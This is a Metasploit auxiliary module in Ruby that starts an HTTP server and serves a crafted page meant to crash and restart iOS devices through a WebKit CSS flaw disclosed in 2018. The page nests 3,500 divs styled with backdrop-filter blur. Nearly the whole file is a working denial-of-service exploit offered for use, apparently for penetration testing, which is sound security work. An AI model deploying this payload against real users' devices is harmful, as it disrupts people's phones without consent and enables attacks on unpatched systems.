##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "iOS Safari Denial of Service with CSS",
        'Description'    => %q(
          This module exploits a vulnerability in WebKit on Apple iOS.
          If successful, the device will restart after viewing the webpage.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Sabri Haddouche', # twitter.com/pwnsdx
        ],
        'References'     => [
          ['URL', 'https://twitter.com/pwnsdx/status/1040944750973595649'],
          ['URL', 'https://gist.github.com/pwnsdx/ce64de2760996a6c432f06d612e33aea'],
          ['URL', 'https://nbulischeck.github.io/apple-safari-crash'],
        ],
        'DisclosureDate' => "Sep 15 2018",
      )
    )
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    print_status("#{cli.peerhost}: Sending response to User-Agent: #{request['User-Agent']}")
    html = %|
<html>
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
  <style>
    div {
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      width:10000px; height:10000px;
    }
  </style>
 </head>
 <body>
 #{'<div>' * 3500 + '</div>' * 3500}
 </body>
</html>
|
    send_response(cli, html)
  end
end
